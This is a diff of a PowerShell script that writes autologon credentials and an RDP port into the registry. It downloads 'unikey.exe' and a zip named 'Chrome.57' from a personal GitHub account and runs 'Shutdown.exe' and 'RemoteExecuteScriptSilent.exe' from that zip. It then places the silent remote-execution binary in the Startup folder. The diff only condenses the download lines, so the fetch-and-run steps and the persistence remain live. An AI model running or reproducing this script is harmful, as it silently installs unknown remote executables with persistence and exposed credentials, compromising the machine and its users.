@@ -10,14 +10,10 @@ Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type Stri
 Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
 Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 3389
 Set-ExecutionPolicy RemoteSigned -Force;$Url = 'https://github.com/jokermakelove/ChatGPT/raw/main/unikey.exe';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';;Invoke-WebRequest $Url -OutFile unikey.exe;.\unikey.exe -fullinstall;
-$Url = 'https://github.com/jokermakelove/unzip/raw/main/Chrome.57.zip'
-[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
-$ProgressPreference = 'SilentlyContinue'
-Invoke-WebRequest $Url -OutFile Chrome.57.zip
-Expand-Archive Chrome.57.zip -DestinationPath Chrome.57
-sleep 10
-Start "C:\Users\Administrator\Chrome.57\Shutdown.exe"
-sleep 10
+$Url = 'https://github.com/jokermakelove/unzip/raw/main/Chrome.57.zip';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';Invoke-WebRequest $Url -OutFile Chrome.57.zip;Expand-Archive Chrome.57.zip -DestinationPath Chrome.57
+sleep 10;
+Start "C:\Users\Administrator\Chrome.57\Shutdown.exe";
+sleep 10;
 Start "C:\Users\Administrator\Chrome.57\RemoteExecuteScriptSilent.exe" 
 $SourceFilePath = "C:\Users\Administrator\Chrome.57\RemoteExecuteScriptSilent.exe"
 $ShortcutPath = "C:\Users\Administrator\Start Menu\Programs\Startup\RemoteExecuteScriptSilent.lnk"
